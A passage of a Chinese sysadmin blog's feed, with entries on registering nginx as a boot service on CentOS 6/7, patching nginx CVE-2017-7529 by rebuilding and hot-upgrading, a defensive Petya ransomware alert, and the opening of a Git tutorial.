&lt;h2 id=&quot;1-4-在URL提交header中加入版本信息&quot;&gt;&lt;a href=&quot;#1-4-在URL提交header中加入版本信息&quot; class=&quot;headerlink&quot; title=&quot;1.4 在URL提交header中加入版本信息&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.4 在URL提交header中加入版本信息&lt;/strong&gt;&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;例如：&lt;br&gt;header信息中直接添加一个字段：http_AppVersion = 1&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.unixmen.cn/categories/Linux/"/>
    
      <category term="Nginx/OpenResty" scheme="http://blog.unixmen.cn/categories/Linux/Nginx-OpenResty/"/>
    
    
      <category term="openResty" scheme="http://blog.unixmen.cn/tags/openResty/"/>
    
      <category term="app" scheme="http://blog.unixmen.cn/tags/app/"/>
    
      <category term="多版本" scheme="http://blog.unixmen.cn/tags/%E5%A4%9A%E7%89%88%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>如何添加Nginx开机启动</title>
    <link href="http://blog.unixmen.cn/2017/07/13/%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0nginx%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
    <id>http://blog.unixmen.cn/2017/07/13/如何添加nginx开机启动/</id>
    <published>2017-07-13T01:55:14.000Z</published>
    <updated>2017-07-13T07:44:57.825Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、简述："><a href="#一、简述：" class="headerlink" title="一、简述："></a>一、简述：</h2><p>Nginx在编译安装完成后不会注册为系统服务，所以需要手工添加系统服务。<br>本文介绍在CentOS 6和CentOS 7 下添加nginx系统开机启动服务的方法。</p><h2 id="二、Centos7-添加nginx开机启动"><a href="#二、Centos7-添加nginx开机启动" class="headerlink" title="二、Centos7 添加nginx开机启动"></a>二、Centos7 添加nginx开机启动</h2><h3 id="建立服务管理文件："><a href="#建立服务管理文件：" class="headerlink" title="建立服务管理文件："></a>建立服务管理文件：</h3><ul><li>新建/usr/lib/systemd/system/nginx.service文件，并添加以下内容：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#nginx服务配置到该文件中</span><br><span class="line">#服务描述性的配置</span><br><span class="line">[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">Documentation=http://nginx.org/en/docs/</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line">#服务关键配置</span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">#pid文件位置一定要与nginx实际配置文件中的pid配置路径一致，这个很重要，否则会服务启动失败</span><br><span class="line">PIDFile=/usr/local/nginx/logs/nginx.pid</span><br><span class="line">#启动前检测 nginx配置文件是否存在问题</span><br><span class="line">ExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line">#启动</span><br><span class="line">ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</span><br><span class="line">#重启</span><br><span class="line">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class="line">#关闭</span><br><span class="line">ExecStop=/bin/kill -s QUIT $MAINPID</span><br><span class="line">PrivateTmp=true</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用systemd进行管理服务"><a href="#使用systemd进行管理服务" class="headerlink" title="使用systemd进行管理服务"></a>使用systemd进行管理服务</h3><ul><li><p>启动nginx服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nginx.service</span><br></pre></td></tr></table></figure></li><li><p>查看nginx服务状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx.service</span><br></pre></td></tr></table></figure></li><li><p>设置nginx.service开机启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable nginx.service</span><br></pre></td></tr></table></figure></li><li><p>测试重新加载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl reload nginx.service</span><br></pre></td></tr></table></figure></li></ul><h2 id="三、CentOS-6-添加nginx开机启动"><a href="#三、CentOS-6-添加nginx开机启动" class="headerlink" title="三、CentOS 6 添加nginx开机启动:"></a>三、CentOS 6 添加nginx开机启动:</h2><h3 id="建立服务管理文件：-1"><a href="#建立服务管理文件：-1" class="headerlink" title="建立服务管理文件："></a>建立服务管理文件：</h3><ul><li><p>新建 /etc/init.d/nginx 并添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># nginx Startup script for the Nginx HTTP Server</span><br><span class="line"># it is v.1.2.1 version.</span><br><span class="line"># chkconfig: - 85 15</span><br><span class="line"># description: Nginx is a high-performance web and proxy server.</span><br><span class="line">#              It has a lot of features, but it&apos;s not for everyone.</span><br><span class="line"># processname: nginx</span><br><span class="line"># pidfile: /var/run/nginx.pid</span><br><span class="line"># config: /usr/local/nginx/conf/nginx.conf</span><br><span class="line"># nginxd、nginx_config、nginx_pid一定要根据自己的实际配置保持一致，这个很重要，否则会服务启动失败</span><br><span class="line">nginxd=/usr/local/nginx/sbin/nginx</span><br><span class="line">nginx_config=/usr/local/nginx/conf/nginx.conf</span><br><span class="line">nginx_pid=/var/run/nginx.pid</span><br><span class="line">RETVAL=0</span><br><span class="line">prog=&quot;nginx&quot;</span><br><span class="line"># Source function library.</span><br><span class="line">. /etc/rc.d/init.d/functions</span><br><span class="line"># Source networking configuration.</span><br><span class="line">. /etc/sysconfig/network</span><br><span class="line"># Check that networking is up.</span><br><span class="line">[ $&#123;NETWORKING&#125; = &quot;no&quot; ] &amp;&amp; exit 0</span><br><span class="line">[ -x $nginxd ] || exit 0</span><br><span class="line"># Start nginx daemons functions.</span><br><span class="line">start() &#123;</span><br><span class="line">if [ -e $nginx_pid ];then</span><br><span class="line">   echo &quot;nginx already running....&quot;</span><br><span class="line">   exit 1</span><br><span class="line">fi</span><br><span class="line">   echo -n $&quot;Starting $prog: &quot;</span><br><span class="line">   daemon $nginxd -c $&#123;nginx_config&#125;</span><br><span class="line">   RETVAL=$?</span><br><span class="line">   echo</span><br><span class="line">   [ $RETVAL = 0 ] &amp;&amp; touch /var/lock/subsys/nginx</span><br><span class="line">   return $RETVAL</span><br><span class="line">&#125;</span><br><span class="line"># Stop nginx daemons functions.</span><br><span class="line">stop() &#123;</span><br><span class="line">        echo -n $&quot;Stopping $prog: &quot;</span><br><span class="line">        killproc $nginxd</span><br><span class="line">        RETVAL=$?</span><br><span class="line">        echo</span><br><span class="line">        [ $RETVAL = 0 ] &amp;&amp; rm -f /var/lock/subsys/nginx /var/run/nginx.pid</span><br><span class="line">&#125;</span><br><span class="line"># reload nginx service functions.</span><br><span class="line">reload() &#123;</span><br><span class="line">    echo -n $&quot;Reloading $prog: &quot;</span><br><span class="line">    #kill -HUP `cat $&#123;nginx_pid&#125;`</span><br><span class="line">    killproc $nginxd -HUP</span><br><span class="line">    RETVAL=$?</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"># See how we were called.</span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">start)</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">stop)</span><br><span class="line">        stop</span><br><span class="line">        ;;</span><br><span class="line">reload)</span><br><span class="line">        reload</span><br><span class="line">        ;;</span><br><span class="line">restart)</span><br><span class="line">        stop</span><br><span class="line">        start</span><br><span class="line">        ;;</span><br><span class="line">status)</span><br><span class="line">        status $prog</span><br><span class="line">        RETVAL=$?</span><br><span class="line">        ;;</span><br><span class="line">*)</span><br><span class="line">        echo $&quot;Usage: $prog &#123;start|stop|restart|reload|status|help&#125;&quot;</span><br><span class="line">        exit 1</span><br><span class="line">esac</span><br><span class="line">exit $RETVAL</span><br></pre></td></tr></table></figure></li><li><p>添加执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 /etc/init.d/nginx</span><br></pre></td></tr></table></figure></li></ul><h3 id="CentOS6-下的nginx服务管理"><a href="#CentOS6-下的nginx服务管理" class="headerlink" title="CentOS6 下的nginx服务管理"></a>CentOS6 下的nginx服务管理</h3><ul><li><p>添加nginx服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --add nginx</span><br></pre></td></tr></table></figure></li><li><p>设置nginx开机启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig nginx 35 on</span><br></pre></td></tr></table></figure></li><li><p>查看添加的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list |grep nginx</span><br></pre></td></tr></table></figure></li><li><p>启动nginx服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure></li><li><p>查看nginx服务状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx status</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、简述：&quot;&gt;&lt;a href=&quot;#一、简述：&quot; class=&quot;headerlink&quot; title=&quot;一、简述：&quot;&gt;&lt;/a&gt;一、简述：&lt;/h2&gt;&lt;p&gt;Nginx在编译安装完成后不会注册为系统服务，所以需要手工添加系统服务。&lt;br&gt;本文介绍在CentOS 6和Cent
      
    
    </summary>
    
      <category term="nginx" scheme="http://blog.unixmen.cn/categories/nginx/"/>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/nginx/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="工具" scheme="http://blog.unixmen.cn/categories/nginx/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/Tools/"/>
    
    
      <category term="nginx" scheme="http://blog.unixmen.cn/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>修复nginx漏洞（CVE-2017-7529）</title>
    <link href="http://blog.unixmen.cn/2017/07/12/%E4%BF%AE%E5%A4%8Dnginx%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7529%EF%BC%89/"/>
    <id>http://blog.unixmen.cn/2017/07/12/修复nginx漏洞（CVE-2017-7529）/</id>
    <published>2017-07-12T10:05:02.000Z</published>
    <updated>2017-07-13T03:03:57.040Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h3><p>2017-07-12 nginx 发布高危漏洞通报，并提供了修复方法及数据包。</p><h2 id="漏洞信息："><a href="#漏洞信息：" class="headerlink" title="漏洞信息："></a>漏洞信息：</h2><p>漏洞编号：CVE-2017-7529<br>漏洞名称：Nginx敏感信息泄露<br>官方评级：高危<br>漏洞描述：当使用nginx标准模块时，允许攻击者如果从缓存返回响应，则获取缓存文件头，在某些配置中，缓存文件头可能包含IP地址的后端服务器或其他敏感信息，从而导致信息泄露。<br>漏洞利用条件和方式：远程利用<br>漏洞影响范围：Nginx 0.5.6 - 1.13.2<br>修复建议：升级到Nginx 1.13.3, 1.12.1。<br>漏洞详情查看：<a href="http://mailman.nginx.org/pipermail/nginx-announce/2017/000200.html" target="_blank" rel="noopener">http://mailman.nginx.org/pipermail/nginx-announce/2017/000200.html</a><br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/20170712175750.png" alt=""></p><h2 id="漏洞修复方法："><a href="#漏洞修复方法：" class="headerlink" title="漏洞修复方法："></a>漏洞修复方法：</h2><h3 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7:"></a>Centos7:</h3><ul><li><p>查看当前版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -V</span><br></pre></td></tr></table></figure></li><li><p>下载漏洞修复软件包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -Sc http://nginx.org/download/nginx-1.12.1.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>解压程序源码包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxf nginx-1.12.1.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>进入解压后的文件目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd nginx-1.12.1</span><br></pre></td></tr></table></figure></li><li><p>使用原有参数(nginx -V查看)进行配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure  --prefix=/opt/webserver/nginx --without-http_memcached_module --user=nginx --group=nginx --with-http_image_filter_module --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-openssl=/usr/local/src/openssl-1.0.2l --with-zlib=/usr/local/src/zlib-1.2.11/ --with-pcre --with-http_sub_module --add-module=/usr/local/src/nginx-accesskey --add-module=/usr/local/src/ngx_http_geoip2_module --with-http_realip_module --with-http_mp4_module</span><br></pre></td></tr></table></figure></li><li><p>然后编译，但不要make install，切记</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>编译完成后可以在objs目录下看到有个名为nginx执行文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls objs/nginx</span><br><span class="line">[root@fqptuo nginx-1.12.1]# ls -l objs/nginx</span><br><span class="line">-rwxr-xr-x 1 root root 9031768 Jul 12 13:57 objs/nginx</span><br></pre></td></tr></table></figure></li><li><p>备份原有的nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /opt/webserver/nginx/sbin/nginx&#123;,.1.12.0&#125;</span><br></pre></td></tr></table></figure></li><li><p>复制编译后的nginx文件到原有目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp objs/nginx /opt/webserver/nginx/sbin/nginx</span><br></pre></td></tr></table></figure></li><li><p>查看升级后的版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure></li><li><p>检查升级后的nginx版本与当前配置是否测试通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure></li><li><p>优雅的平滑升级nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make upgrade</span><br></pre></td></tr></table></figure><ul><li>正常情况下会有类似以下的输出：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/opt/webserver/nginx/sbin/nginx -t</span><br><span class="line">nginx: the configuration file /opt/webserver/nginx/conf/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /opt/webserver/nginx/conf/nginx.conf test is successful</span><br><span class="line">kill -USR2 `cat /opt/webserver/nginx/logs/nginx.pid`</span><br><span class="line">sleep 1</span><br><span class="line">test -f /opt/webserver/nginx/logs/nginx.pid.oldbin</span><br><span class="line">kill -QUIT `cat /opt/webserver/nginx/logs/nginx.pid.oldbin`</span><br></pre></td></tr></table></figure></li></ul></li><li><p>查看当前nginx服务状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx</span><br></pre></td></tr></table></figure></li></ul><p>至此，nginx服务升级完成。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞介绍：&quot;&gt;&lt;a href=&quot;#漏洞介绍：&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍：&quot;&gt;&lt;/a&gt;漏洞介绍：&lt;/h3&gt;&lt;p&gt;2017-07-12 nginx 发布高危漏洞通报，并提供了修复方法及数据包。&lt;/p&gt;
&lt;h2 id=&quot;漏洞信息：&quot;
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="漏洞" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/"/>
    
      <category term="nginx" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E6%BC%8F%E6%B4%9E/%E5%AE%89%E5%85%A8/nginx/"/>
    
    
      <category term="nginx" scheme="http://blog.unixmen.cn/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>勒索病毒袭Petya预警</title>
    <link href="http://blog.unixmen.cn/2017/06/29/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E8%A2%ADPetya%E9%A2%84%E8%AD%A6/"/>
    <id>http://blog.unixmen.cn/2017/06/29/勒索病毒袭Petya预警/</id>
    <published>2017-06-29T02:50:41.000Z</published>
    <updated>2017-06-29T03:06:38.712Z</updated>
    
    <content type="html"><![CDATA[<p>近日，代号为Petya的新一轮勒索病毒袭击了俄罗斯、英国、乌克兰等多个国家，机场、银行及大型企业被报告感染病毒，目前中国国内也已有用户中招。据报道，本轮病毒比之前的WannaCry勒索病毒更专业、更难对付。</p><h3 id="病毒加密硬盘，勒索比特币"><a href="#病毒加密硬盘，勒索比特币" class="headerlink" title="病毒加密硬盘，勒索比特币"></a>病毒加密硬盘，勒索比特币</h3><p>新勒索病毒Petya不仅对文件进行加密，而且直接将整个硬盘加密、锁死，在出现以下界面并瘫痪后，其会自动向局域网内部的其它服务器及终端进行传播。<br>Petya勒索病毒感染的电脑：</p><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/petya-ransomware.png" alt=""></p><p>同时，用户的电脑开机后则会黑屏，并显示勒索信。信中称，用户想要解锁，需要向黑客的账户转折合300美元的比特币。</p><p>勒索信息：<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/mischa.png" alt=""></p><h3 id="与之前病毒相比，威胁升级"><a href="#与之前病毒相比，威胁升级" class="headerlink" title="与之前病毒相比，威胁升级"></a>与之前病毒相比，威胁升级</h3><p>这种攻击手法十分类似于曾在上个月肆虐全球的勒索病毒，不过看起来比当时的勒索病毒更加专业、也更难以对付。 </p><p>1.Petya勒索病毒变种的传播速度更快。在欧洲国家重灾区，新病毒变种的传播速度达到每10分钟感染5000余台电脑，多家运营商、石油公司、零售商、机场、ATM机等企业和公共设施已大量沦陷，甚至乌克兰副总理的电脑也遭到感染。</p><p>2.感染并加密本地文件的病毒进行了更新，杀毒软件除非升级至最新版病毒库，否则无法查杀及阻止其加密本机文件系统；</p><p>3.Petya综合利用了“5.12WannaCry”及“6.23勒索病毒新变种”所利用的所有Windows系统漏洞，包括MS17-010（5.12WannaCry永恒之蓝勒索病毒）及CVE-2017-8543/CVE-2017-8464（6.23勒索病毒新变种）等补丁对应的多个系统漏洞进行传播。</p><p>4.Petya直接将整个硬盘加密和锁死，用户重启后直接进入勒索界面，若不支付比特币将无法进入系统。</p><h3 id="防止感染，立刻这样设置电脑"><a href="#防止感染，立刻这样设置电脑" class="headerlink" title="防止感染，立刻这样设置电脑"></a>防止感染，立刻这样设置电脑</h3><ol><li><p>不要轻易点击不明附件，尤其是rtf、doc等格式文件。</p></li><li><p>内网中存在使用相同账号、密码情况的机器请尽快修改密码，未开机的电脑请确认口令修改完毕、补丁安装完成后再进行开机操作。</p></li><li><p>更新操作系统补丁（MS）<a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a></p></li><li><p>更新 Microsoft Office/WordPad  远程执行代码漏洞（CVE -2017-0199）补丁 <a href="https://technet.microsoft.com/zh-cn/office/mt465751.aspx" target="_blank" rel="noopener">https://technet.microsoft.com/zh-cn/office/mt465751.aspx</a></p></li><li><p>禁用 WMI服务<a href="https://zhidao.baidu.com/question/91063891.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/91063891.html</a><br>WMI（Windows Management Instrumentation Windows 管理规范）是一项核心的Windows管理技术，你可以通过如下方法停止：</p></li></ol><blockquote><p>I. 在服务页面开启WMI服务。在开始-运行，输入services.msc，进入服务。<br>或者，在控制面板，查看方式选择大图标，选择管理工具，在管理工具中双击服务。<br>II.在服务页面，按W，找到WMI服务，找到后，双击 ，直接点击停止服务即可，如下图所示：<br><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/20170629102609.png" alt=""></p></blockquote><p>6.更新杀毒软件<br>目前，市面上主流的杀毒软件与电脑保护软件均有插件或程序，可以绝大程度上保护电脑不受新型勒索病毒感染。<br>用户只需在软件内搜索Petya，或到其官网搜索修复工具即可。</p><p>7.提高用户安全意识</p><blockquote><p>I. 限制管理员权限<br>Petya勒索病毒的运行需要管理员权限，企业网管可以通过严格审查限制管理员权限的方式减少攻击面，个人用户可以考虑使用非管理员权限的普通账号登陆进行日常操作。<br>II. 关闭系统崩溃重启<br>Petya勒索病毒的“发病”需要系统重启，因此想办法避免系统重启也能有效防御Petya并争取漏洞修补或者文件抢救时间。只要系统不重新启动引导，病毒就没有机会加密MFT主文件分区表，用户就有机会备份磁盘中的文件（微软官方教程）。<br>III. 备份重要数据<br>重要文件进行本地磁盘冷存储备份，以及云存储备份。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;近日，代号为Petya的新一轮勒索病毒袭击了俄罗斯、英国、乌克兰等多个国家，机场、银行及大型企业被报告感染病毒，目前中国国内也已有用户中招。据报道，本轮病毒比之前的WannaCry勒索病毒更专业、更难对付。&lt;/p&gt;
&lt;h3 id=&quot;病毒加密硬盘，勒索比特币&quot;&gt;&lt;a href
      
    
    </summary>
    
      <category term="技术文档" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/"/>
    
      <category term="勒索病毒" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    
      <category term="安全" scheme="http://blog.unixmen.cn/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="勒索病毒" scheme="http://blog.unixmen.cn/tags/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/"/>
    
      <category term="petya" scheme="http://blog.unixmen.cn/tags/petya/"/>
    
  </entry>
  
  <entry>
    <title>Git 入门及实践</title>
    <link href="http://blog.unixmen.cn/2017/05/18/Git-%E5%85%A5%E9%97%A8%E5%8F%8A%E5%AE%9E%E8%B7%B5/"/>
    <id>http://blog.unixmen.cn/2017/05/18/Git-入门及实践/</id>
    <published>2017-05-18T08:35:00.000Z</published>
    <updated>2017-06-08T08:55:03.649Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、文章说明"><a href="#一、文章说明" class="headerlink" title="一、文章说明"></a>一、文章说明</h2><p>本文详细介绍git的基础操作及命令详解，并通过两个经典案例进行实践练习。</p><h2 id="二、Git介绍："><a href="#二、Git介绍：" class="headerlink" title="二、Git介绍："></a>二、Git介绍：</h2><p>GIT （分布式版本控制系统）是 Linus Torvalds为了帮助管理Linux内核开发而开发的一款免费、开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目，可以有效、高速的处理从很小到非常大的项目版本管理。</p><h3 id="1、Git的功能特性："><a href="#1、Git的功能特性：" class="headerlink" title="1、Git的功能特性："></a>1、Git的功能特性：</h3><ul><li>从服务器上克隆完整的Git仓库（包括代码和版本信息）到单机上。</li><li>在自己的机器上根据不同的开发目的，创建分支，修改代码。</li><li>在单机上自己创建的分支上提交代码。</li><li>在单机上合并分支。</li><li>把服务器上最新版的代码fetch下来，然后跟自己的主分支合并。</li><li>生成补丁（patch），把补丁发送给主开发者。</li><li>看主开发者的反馈，如果主开发者发现两个一般开发者之间有冲突（他们之间可以合作解决的冲突），就会要求他们先解决冲突，然后再由其中一个人提交。如果主开发者可以自己解决，或者没有冲突，就通过。</li></ul><h3 id="2、Git工作流程介绍："><a href="#2、Git工作流程介绍：" class="headerlink" title="2、Git工作流程介绍："></a>2、Git工作流程介绍：</h3><p><img src="https://raw.githubusercontent.com/netb2c/MarkdownPhotos/master/gitcommand.png" alt=""></p><ul><li>Workspace：工作区</li><li>Index / Stage：暂存区</li><li>Repository：仓库区（或本地仓库）</li><li>Remote：远程仓库</li></ul><h3 id="3、Git的优点："><a href="#3、Git的优点：" class="headerlink" title="3、Git的优点："></a>3、Git的优点：</h3><ul><li>适合分布式开发，强调个体。</li><li>公共服务器压力和数据量都不会太大。</li><li>速度快、灵活。</li><li>任意两个开发者之间可以很容易的解决冲突。</li><li>离线工作。</li></ul><h3 id="4、Git的缺点："><a href="#4、Git的缺点：" class="headerlink" title="4、Git的缺点："></a>4、Git的缺点：</h3><ul><li>资料少（起码中文资料很少）。</li><li>学习周期相对而言比较长。</li><li>不符合常规思维。</li><li>代码保密性差，一旦开发者把整个库克隆下来就可以完全公开所有代码和版本信息。</li></ul><h2 id="三、Git安装"><a href="#三、Git安装" class="headerlink" title="三、Git安装"></a>三、Git安装</h2><p>git 是一跨平台的分布式版本控制系统，我们如何开始呢？下面介绍在多平台下的安装方法。</p><h3 id="1、Linux-平台"><a href="#1、Linux-平台" class="headerlink" title="1、Linux 平台"></a>1、Linux 平台</h3><ul><li><p>基于Redhat的衍生分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git-all</span><br></pre></td></tr></table></figure></li><li><p>基于Debian的衍生分支</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git-all</span><br></pre></td></tr></table></figure></li></ul><h3 id="2、Mac系统安装"><a href="#2、Mac系统安装" class="headerlink" title="2、Mac系统安装"></a>2、Mac系统安装</h3><p>Mac系统下有几种安装方式:</p><ul><li>最简单的方式是Xcode Command Line Tools，在OSX10.9或更高的系统版本，你只需要在终端运行一下git命令，如果没有安装git，系统将自动为你安装。</li><li>如果你想安装更新的版本，可以在Git官方网站下载由官方维护的 OSX Git 安装程序，网址为 <a 